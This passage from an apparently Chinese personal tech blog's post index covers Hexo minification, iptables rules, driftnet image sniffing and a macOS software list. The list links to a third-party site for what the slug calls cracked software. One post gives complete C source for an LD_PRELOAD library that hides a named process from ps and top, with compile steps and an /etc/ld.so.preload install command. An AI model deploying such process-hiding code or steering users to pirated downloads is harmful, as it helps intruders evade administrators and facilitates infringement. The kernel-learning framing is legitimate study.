minifier  hexo.config.html_minifier = Object.assign({    enable: true,    exclude: [],    ignoreCustomComments: [/^\s*more/],    removeComments: true,    removeCommentsFromCDATA: true,    collapseWhitespace: true,    collapseBooleanAttributes: true,    removeEmptyAttributes: true,    minifyJS: true,    minifyCSS: true,    silent: false  }, hexo.config.html_minifier);  // Css minifier  hexo.config.css_minifier = Object.assign({    enable: true,    exclude: [&#39;*.min.css&#39;],    silent: false  }, hexo.config.css_minifier);  // Js minifier  hexo.config.js_minifier = Object.assign({    enable: true,    mangle: true,    output: {},    compress: {},    exclude: [&#39;*.min.js&#39;],    silent: false  }, hexo.config.js_minifier);  // Image minifier  hexo.config.image_minifier = Object.assign({    enable: true,    interlaced: false,    multipass: false,    optimizationLevel: 3,    pngquant: false,    progressive: false,    silent: false  }, hexo.config.image_minifier);  // Js concator  hexo.config.js_concator = Object.assign({    enable: false,    bundle_path: &#39;js/bundle.js&#39;,    front: false,    silent: false  }, hexo.config.js_concator);  hexo.extend.filter.register(&#39;after_render:html&#39;, require(&#39;./lib/optimizeHTML&#39;));  hexo.extend.filter.register(&#39;after_render:css&#39;, require(&#39;./lib/optimizeCSS&#39;));  hexo.extend.filter.register(&#39;after_render:js&#39;, require(&#39;./lib/optimizeJS&#39;));  hexo.extend.filter.register(&#39;after_generate&#39;, require(&#39;./lib/optimizeImage&#39;));  hexo.extend.filter.register(&#39;after_generate&#39;, require(&#39;./lib/concatJS&#39;));}</code></pre><blockquote><p>这里初始化了一些默认的配置项，然后注册了一些渲染后钩子函数，处理函数在 <code>./lib</code> 文件夹下。</p><ul><li>optimizeHTML 依赖 <code>html-minifier</code></li><li>optimizeCSS 依赖 <code>clean-css</code></li><li>optimizeJS 依赖 <code>uglify-es</code></li><li>optimizeImage 依赖 <code>imagemin</code></li></ul></blockquote><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol><li>图片压缩报错</li></ol><pre><code class="lang-bash"># Hint$ Error: spawn /.../node_modules/jpegtran-bin/vendor/jpegtran ENOENT# 解决方案# Reference: https://github.com/imagemin/imagemin/issues/154$ yarn add -D jpegtran-bin</code></pre>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> FrontEnd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables 简介</title>
      <link href="/2019/06/16/033_Port_Forwarding_Tutorial/"/>
      <url>/2019/06/16/033_Port_Forwarding_Tutorial/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>说道端口转发大家一定不陌生，路由器上经常操作端口映射，把内网端口映射到路由器端口，从而通过路由器的公网 IP 便可以访问内网端口。这一切归功于 iptables，当然 iptables 除了做端口转发，还有非常多的其他功能，本文就来详细介绍一下 iptables，并提供一些常用案例。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>iptables</code> 是一种 IP 信息包过滤系统，包含4个表，5个链。其中表是按照对数据包的操作区分的，链是按照不同的Hook点来区分的，具体包含关系为 <code>iptables</code> -&gt; <code>Tables</code> -&gt; <code>Chains</code> -&gt; <code>Rules</code>。其实 iptables 不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过 <code>iptables</code> 这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫 <code>netfilter</code>。</p><h3 id="四个表"><a href="#四个表" class="headerlink" title="四个表"></a>四个表</h3><ul><li><code>FILTTER</code>：一般的过滤功能</li><li><code>NAT</code>：用于nat功能（端口映射，地址映射等）</li><li><code>MANGLE</code>：用于对特定数据包的修改</li><li><code>RAW</code>：优先级最高，设置raw时一般是为了不再让iptables做数据包的链接跟踪处理，提高性能</li></ul><h3 id="五个链"><a href="#五个链" class="headerlink" title="五个链"></a>五个链</h3><ul><li><code>PREROUTING</code>：数据包进入路由表之前</li><li><code>INPUT</code>：通过路由表后目的地为本机</li><li><code>FORWARD</code>：通过路由表后，目的地不为本机</li><li><code>OUTPUT</code>：由本机产生，向外转发</li><li><code>POSTROUTIONG</code>：发送到网卡接口之前</li></ul><h3 id="包含关系"><a href="#包含关系" class="headerlink" title="包含关系"></a>包含关系</h3><img src="/2019/06/16/033_Port_Forwarding_Tutorial/relationships.png"><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><img src="/2019/06/16/033_Port_Forwarding_Tutorial/workflow.png"><h2 id="实用案例"><a href="#实用案例" class="headerlink" title="实用案例"></a>实用案例</h2><h3 id="开始、停止、重启-iptables-服务"><a href="#开始、停止、重启-iptables-服务" class="headerlink" title="开始、停止、重启 iptables 服务"></a>开始、停止、重启 iptables 服务</h3><pre><code class="lang-bash">$ systemctl start iptables$ systemctl stop iptables$ systemctl restart iptables</code></pre><h3 id="查看所有规则"><a href="#查看所有规则" class="headerlink" title="查看所有规则"></a>查看所有规则</h3><pre><code class="lang-bash">$ iptables -L -n -v# 具体看某个表的规则，如 nat$ iptables -t nat -L -n -v</code></pre><ul><li><code>-L</code> list，列举规则</li><li><code>-n</code> numeric，显示ip地址</li><li><code>-v</code> verbose，详细输出</li></ul><h3 id="清空所有规则"><a href="#清空所有规则" class="headerlink" title="清空所有规则"></a>清空所有规则</h3><pre><code class="lang-bash"># 清除默认 FILTER 链$ iptables -F# 清除 nat 表中的所有链$ iptables -t nat -F</code></pre><ul><li><code>-F</code> flush，清空规则</li></ul><h3 id="保存、恢复-iptables"><a href="#保存、恢复-iptables" class="headerlink" title="保存、恢复 iptables"></a>保存、恢复 iptables</h3><pre><code class="lang-bash"># 保存 iptables 规则到文件$ iptables-save &gt; ~/iptables.rules# 从文件恢复 iptables 规则$ iptables-restore &lt; ~/iptables.rules</code></pre><h3 id="屏蔽某个IP地址"><a href="#屏蔽某个IP地址" class="headerlink" title="屏蔽某个IP地址"></a>屏蔽某个IP地址</h3><pre><code class="lang-bash">$ iptables -A INPUT -s xxx.xxx.xxx.xxx -j DROP</code></pre><p>如果你想取消屏蔽</p><pre><code class="lang-bash">$ iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP</code></pre><p>如果只是想屏蔽 tcp 流量</p><pre><code class="lang-bash">$ iptables -A INPUT -p tcp -s xxx.xxx.xxx.xxx -j DROP</code></pre><ul><li><code>-A [chain]</code> append，增加规则</li><li><code>-D [chain]</code> delete，删除规则</li><li><code>-s [address/mask[...]]</code> source，源地址</li><li><code>-j [target]</code> jump，处理动作</li><li><code>-p [proto]</code> protocol，协议，<code>icmp</code>、<code>tcp</code>、<code>udp</code> 等</li></ul><h3 id="屏蔽某个端口"><a href="#屏蔽某个端口" class="headerlink" title="屏蔽某个端口"></a>屏蔽某个端口</h3><pre><code class="lang-bash"># 屏蔽从8080端口传出的连接$ iptables -A OUTPUT -p tcp --dport 8080 -j DROP# 屏蔽传入8080端口的连接$ iptables -A INPUT -p tcp --dport 8080 -j ACCEPT# 屏蔽多个端口的$ iptables -A INPUT  -p tcp -m multiport --dports 22,80,443 -j ACCEPT$ iptables -A OUTPUT -p tcp -m multiport --sports 22,80,443 -j ACCEPT</code></pre><h3 id="屏蔽某个MAC地址"><a href="#屏蔽某个MAC地址" class="headerlink" title="屏蔽某个MAC地址"></a>屏蔽某个MAC地址</h3><pre><code class="lang-bash">$ iptables -A INPUT -m mac --mac-source 00:00:00:00:00:00 -j DROP</code></pre><h3 id="设置端口转发"><a href="#设置端口转发" class="headerlink" title="设置端口转发"></a>设置端口转发</h3><pre><code class="lang-bash"># 设置允许转发 $ echo 1 &gt; /proc/sys/net/ipv4/ip_forward# 发往本地 80 端口的流量转发到本地 10000 端口（sslstrip 常用）$ iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 10000# 在主机 A 上设置，访问[ip_a]:[port_a] 就相当于访问 [ip_b]:[port_b]，[ip_a] 不能是 lo 地址$ iptables -t nat -A PREROUTING -d [ip_a] -p tcp --dport [port_a] -j DNAT --to-destination [ip_b]:[port_b] $ iptables -t nat -A POSTROUTING -d [ip_b] -p tcp --dport [port_b] -j SNAT --to-source [ip_a]</code></pre><ul><li><code>-i [interface]</code> 网卡名</li></ul><h3 id="禁止-Ping，即屏蔽-ICMP-协议"><a href="#禁止-Ping，即屏蔽-ICMP-协议" class="headerlink" title="禁止 Ping，即屏蔽 ICMP 协议"></a>禁止 Ping，即屏蔽 ICMP 协议</h3><pre><code class="lang-bash">$ iptables -A INPUT -p icmp -i eth0 -j DROP</code></pre><h3 id="限制连接数"><a href="#限制连接数" class="headerlink" title="限制连接数"></a>限制连接数</h3><pre><code class="lang-bash"># 限制端口的连接数$ iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/minute --limit-burst 200 -j ACCEPT# 限制并发的连接数，例如允许每个客户端最多建立3个ssh连接$ iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j REJECT</code></pre><ul><li><code>--limit 100/minute</code> 传入连接限制为100个每分钟</li><li><code>--limit-burst 200</code> 仅当连接总数达到200个以后才开始限制连接数</li></ul>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS 自用软件收藏清单（附下载链接）</title>
      <link href="/2019/06/15/032_OSX_Cracked_Software_Resources/"/>
      <url>/2019/06/15/032_OSX_Cracked_Software_Resources/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文收录了自己在 MacOS 上常用的软件，附有第三方下载页面链接，如果链接崩了请在下方留言告知，也欢迎大家分享补充。</p></blockquote><h2 id="效率工具"><a href="#效率工具" class="headerlink" title="效率工具"></a>效率工具</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>Alfred</td><td>Spotlight终极加强版，效率神器不解释</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/alfred.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Things</td><td>时间管理，任务管理</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/things.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Fantastical</td><td>优雅的日历软件，非常好用</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/fantastical.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Karabiner-Elements</td><td>改键神器</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/karabiner-elements.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Unclutter</td><td>剪贴板工具，也可以临时记记笔记，很实用</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/unclutter.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Paste</td><td>剪贴板管理，支持回溯、分类，界面很酷炫</td><td><span style="font-size:20px;line-height:20px">★★★★☆</span></td><td><a href="https://xclient.info/s/paste-for-mac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Vanilla</td><td>菜单栏图标管理</td><td><span style="font-size:20px;line-height:20px">★★★★☆</span></td><td><a href="https://xclient.info/s/vanilla.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Übersicht</td><td>桌面自定义React小部件</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://github.com/felixhageloh/uebersicht" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>CleanMyMac</td><td>强大酷炫的系统清理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/cleanmymac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>App Cleaner</td><td>软件清理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/app-cleaner-uninstaller-pro.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Parallels Desktop</td><td>虚拟机解决方案</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/parallels-desktop.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>balenaEtcher</td><td>启动盘制作工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://github.com/balena-io/etcher/releases" target="_blank" rel="noopener">Download</a></td></tr><tr><td>iStat Menus</td><td>炫酷的系统监控工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/istat-menus-for-mac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Snagit</td><td>强大的截屏软件</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/snagit.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Free Download Manager</td><td>多线程下载工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://www.freedownloadmanager.org/zh/" target="_blank" rel="noopener">Download</a></td></tr><tr><td>TeamViewer</td><td>远程控制</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/teamviewer.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Transmit</td><td>FTP客户端</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/transmit.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>WiFi Scanner</td><td>无线网络扫描管理工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/wifi-scanner.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Gas Mask</td><td>系统 hosts 文件修改器</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/gas-mask.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="开发相关"><a href="#开发相关" class="headerlink" title="开发相关"></a>开发相关</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>SnippetsLab</td><td>构建你的私人代码片段库</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/snippetslab.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Navicat Premium</td><td>强大的数据库管理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/navicat-premium.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Mathematica</td><td>数学计算工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="">Download</a></td></tr><tr><td>Expressions</td><td>正则表达式工具</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/expressions.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>File Juicer</td><td>无损文件提取器</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/file-juicer.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>OmniPlan</td><td>项目管理流程软件</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/omni-plan.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>OmniGraffle</td><td>图表绘制工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/omnigraffle.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>XMind: ZEN</td><td>思维导图</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/xmind-zen.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>MarginNote</td><td>PDF阅读笔记工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/marginnote-pro.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="媒体相关"><a href="#媒体相关" class="headerlink" title="媒体相关"></a>媒体相关</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>Boom 3D</td><td>音效增强工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/boom-3d.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>INNA</td><td>功能强大的开源媒体播放工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://github.com/iina/iina" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用 driftnet 嗅探网络图片</title>
      <link href="/2019/05/24/031_Driftnet_Tutorial/"/>
      <url>/2019/05/24/031_Driftnet_Tutorial/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>driftnet 是 Kali Linux 中内置的一个网络图片嗅探工具，常配合 ettercap、arpsproof 或其他 arp 欺骗工具一起使用。因为在 MacOS 上安装的时候遇到了一些困难，故做此记录，方便以后查阅。以后有时间可以详细介绍一下 arp 攻击原理。本文纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><p>在 Ubuntu 或者 Kali 上安装较为简单，就不多做介绍，下面安装教程只针对 macOS。网上很多用 macports 的安装教程都不能用了，目前在 mac 上只能通过源码编译安装。</p><pre><code class="lang-bash">$ git clone https://github.com/deiv/driftnet.git$ cd driftnet$ autoreconf -fi$ ./configure$ make -j8$ make install</code></pre><h2 id="报错及解决方案"><a href="#报错及解决方案" class="headerlink" title="报错及解决方案"></a>报错及解决方案</h2><ul><li>gtk 问题</li></ul><p>把 configure 中所有 x11 替换成 quartz，下面脚本中 gtk 版本可能不一致，请自行替换。</p><pre><code class="lang-bash">sed -i &#39;.backup&#39; &#39;s/x11/quartz/g&#39; configure &amp;&amp; rm configure.backupcd /usr/local/Cellar/gtk+/2.24.31_1/include/gtk-2.0/gdkln -s gdk.h gdkx.hcd -</code></pre><ul><li>提示找不到 openssl</li></ul><pre><code class="lang-bash">export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib -L/usr/local/lib -L/usr/local/opt/expat/lib&quot;export CFLAGS=&quot;-I/usr/local/opt/openssl/include/ -I/usr/local/include -I/usr/local/opt/expat/include&quot;export CPPFLAGS=&quot;-I/usr/local/opt/openssl/include/ -I/usr/local/include -I/usr/local/opt/expat/include&quot;export LIBRARY_PATH=/usr/local/opt/openssl/lib</code></pre><ul><li>ehter.h 报错</li></ul><p>编辑 src/network/layer2.c</p><pre><code class="lang-c++">#include &lt;netinet/ether.h&gt;替换成#include &lt;netinet/if_ether.h&gt;</code></pre><ul><li>编辑 src/compat/config.h</li></ul><p>在末尾追加</p><pre><code class="lang-c++">#ifndef _FUCK_ETHER__#define _FUCK_ETHER__#define ETH_ALEN 6 #define ETH_HLAN 14 #define ETH_ZLEN 60 #define ETH_DATA_LEN 1500 #define ETH_FRAME_LEN 1514 #define ETH_FCS_LEN 4  #define ETH_P_IP 0x0800#define ETH_P_IPV6 0x86DD#define ETH_P_ARP 0x0806#define ETH_P_PAE 0x888Estruct ethhdr{    unsigned char h_dest[ETH_ALEN];    unsigned char h_source[ETH_ALEN];    unsigned short h_proto;}__attribute__((packed));#endif</code></pre><h2 id="使用演示"><a href="#使用演示" class="headerlink" title="使用演示"></a>使用演示</h2><pre><code>$ driftnet -i en0 # 你的网卡名</code></pre><p>打开浏览器看一些图片，发现图片内容已经被捕获到了。</p><img src="/2019/05/24/031_Driftnet_Tutorial/driftnet.png"><p>如果再配合 MITM，你懂的。</p>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何隐藏 Linux 进程</title>
      <link href="/2019/05/19/030_How_to_Hide_Linux_Process/"/>
      <url>/2019/05/19/030_How_to_Hide_Linux_Process/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在学习 linux 内核原理，纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="ps指令是如何工作的？"><a href="#ps指令是如何工作的？" class="headerlink" title="ps指令是如何工作的？"></a><code>ps</code>指令是如何工作的？</h2><p>我们可以使用 <code>sysdig</code> 跟踪 <code>ps</code> 指令的执行细节</p><pre><code class="lang-bash">$ sysdig proc.name = ps...2088196 23:47:45.419817127 7 ps (22956) &gt; openat2088197 23:47:45.419818054 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/stat) dirfd=-100(AT_FDCWD) name=/proc/30245/stat flags=1(O_RDONLY) mode=02088198 23:47:45.419818411 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/stat) size=20482088199 23:47:45.419819843 7 ps (22956) &lt; read res=182 data=30245 ((sd-pam)) S 30244 30244 30244 0 -1 1077936448 46 0 0 0 0 0 0 0 20 0 1 0 12088200 23:47:45.419820050 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/stat)2088201 23:47:45.419820178 7 ps (22956) &lt; close res=02088202 23:47:45.419822308 7 ps (22956) &gt; openat2088203 23:47:45.419824137 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/status) dirfd=-100(AT_FDCWD) name=/proc/30245/status flags=1(O_RDONLY) mode=02088204 23:47:45.419824495 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/status) size=20482088205 23:47:45.419829683 7 ps (22956) &lt; read res=1329 data=Name:.(sd-pam).Umask:.0002.State:.S (sleeping).Tgid:.30245.Ngid:.0.Pid:.30245.PP2088206 23:47:45.419829879 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/status)2088207 23:47:45.419830002 7 ps (22956) &lt; close res=02088208 23:47:45.419831829 7 ps (22956) &gt; getdents fd=5(&lt;d&gt;/proc)2088209 23:47:45.419833030 7 ps (22956) &lt; getdents res=02088210 23:47:45.419834153 7 ps (22956) &gt; close fd=5(&lt;d&gt;/proc)2088211 23:47:45.419834873 7 ps (22956) &lt; close res=0...</code></pre><p>由此可以分析出 <code>ps</code> 的执行流程如下：</p><ol><li>通过 <code>openat</code> 函数打开目录 <code>/proc</code>。</li><li>在该进程在打开的目录上调用 <code>getdents</code> 函数，得到 <code>/proc</code> 下的目录列表</li><li>遍历每个子目录中的一组固定文件。从事件列表中可以看到，这些文件名为 <code>/proc/{PID}/status</code>，<code>/proc/PID/stat</code> 和 <code>/proc/PID/cmdline</code>，即为 <code>ps</code> 输出的信息。</li></ol><blockquote><p>进程本身不直接调用 <code>openat</code> 和 <code>getdents</code>， 因为这些是由C标准库（<code>libc</code>）抽象的系统调用。如果你曾经读过 <code>libc</code> 文档，<code>libc</code> 提供了两个不同的函数，<code>opendir</code> 和 <code>readdir</code>，它们负责自己调用系统调用，为开发人员提供了一个更简单的API。</p></blockquote><h2 id="3种隐藏进程的思路"><a href="#3种隐藏进程的思路" class="headerlink" title="3种隐藏进程的思路"></a>3种隐藏进程的思路</h2><ol><li>修改替换类似 <code>ps</code>、<code>lsof</code>、<code>top</code>、<code>htop</code> … 等常用运维工具的二进制文件。</li><li>覆盖 <code>libc</code> 中的 <code>readdir</code> 函数</li><li>修改内核中的系统调用，hook 系统的 <code>getdents</code> 事件</li></ol><p>下文采用第二种方法来实现</p><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><h3 id="新建-processhider-c"><a href="#新建-processhider-c" class="headerlink" title="新建 processhider.c"></a>新建 <code>processhider.c</code></h3><p>修改 <code>process_to_filter</code> 为你要隐藏的进程名</p><pre><code class="lang-c">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;dirent.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;// !!! Replace to your Process Namestatic const char* process_to_filter = &quot;test.py&quot;;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)                                \static struct dirent* (*original_##readdir)(DIR*) = NULL;               \                                                                        \struct dirent* readdir(DIR *dirp)                                       \{                                                                       \    if(original_##readdir == NULL) {                                    \        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \        if(original_##readdir == NULL)                                  \        {                                                               \            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \        }                                                               \    }                                                                   \                                                                        \    struct dirent* dir;                                                 \                                                                        \    while(1)                                                            \    {                                                                   \        dir = original_##readdir(dirp);                                 \        if(dir) {                                                       \            char dir_name[256];                                         \            char process_name[256];                                     \            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \                strcmp(process_name, process_to_filter) == 0) {         \                continue;                                               \            }                                                           \        }                                                               \        break;                                                          \    }                                                                   \    return dir;                                                         \}DECLARE_READDIR(dirent64, readdir64);DECLARE_READDIR(dirent, readdir);</code></pre><h3 id="编译成动态链接库"><a href="#编译成动态链接库" class="headerlink" title="编译成动态链接库"></a>编译成动态链接库</h3><pre><code class="lang-bash">$ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl$ mv libprocesshider.so /usr/local/lib/</code></pre><h3 id="覆盖系统调用"><a href="#覆盖系统调用" class="headerlink" title="覆盖系统调用"></a>覆盖系统调用</h3><p><code>/etc/ld.so.preload</code> 这是个神奇的文件，写在这个文件里的库会比系统标准库优先调用。因此我们只要把刚才生成好的动态链接库添加到这个文件中就大功告成了</p><pre><code class="lang-bash">$ echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>新建一个测试文件 <code>test.py</code></p><pre><code class="lang-python">#!/usr/bin/pythonwhile True:    print &quot;Hello&quot;</code></pre><p>执行</p><pre><code class="lang-bash">$ chmod +x test.py$ ./test.py</code></pre><p>再开一个 <code>terminal</code> 查看 <code>ps</code> 或者 <code>top</code>，发现 <code>test.py</code> 已经不见了。</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAV 音频文件格式解析</title>
      <link href="/2019/05/15/029_WAV_Format_Parsing/"/>
      <url>/2019/05/15/029_WAV_Format_Parsing/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>由于最近工作中使用到了多路音频采样数据的处理，故补充一波wav格式解析的知识，本文大部分资料来源于网络，我只做了收集归纳的工作。下方附有原文连接，若有侵权，请在下方留言告知。</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Waveform Audio File Format（WAVE，又或者是因为WAV后缀而被大众所知的），它采用RIFF（Resource Interchange File Format）文件格式结构。通常用来保存PCM格式的原始音频数据，所以通常被称为无损音频。但是严格意义上来讲，WAV也可以存储其它压缩格式的音频数据。</p><h2 id="格式解析"><a href="#格式解析" class="headerlink" title="格式解析"></a>格式解析</h2><p>WAV文件遵循RIFF规则，其内容以区块（chunk）为最小单位进行存储。WAV文件一般由3个区块组成：RIFF chunk、Format chunk和Data chunk。另外，文件中还可能包含一些可选的区块，如：Fact chunk、Cue points chunk、Playlist chunk、Associated data list chunk等。<br>本文将只介绍RIFF chunk、Format chunk和Data chunk。</p><img src="/2019/05/15/029_WAV_Format_Parsing/wav_format.png"><h3 id="RIFF区块"><a href="#RIFF区块" class="headerlink" title="RIFF区块"></a>RIFF区块</h3><div 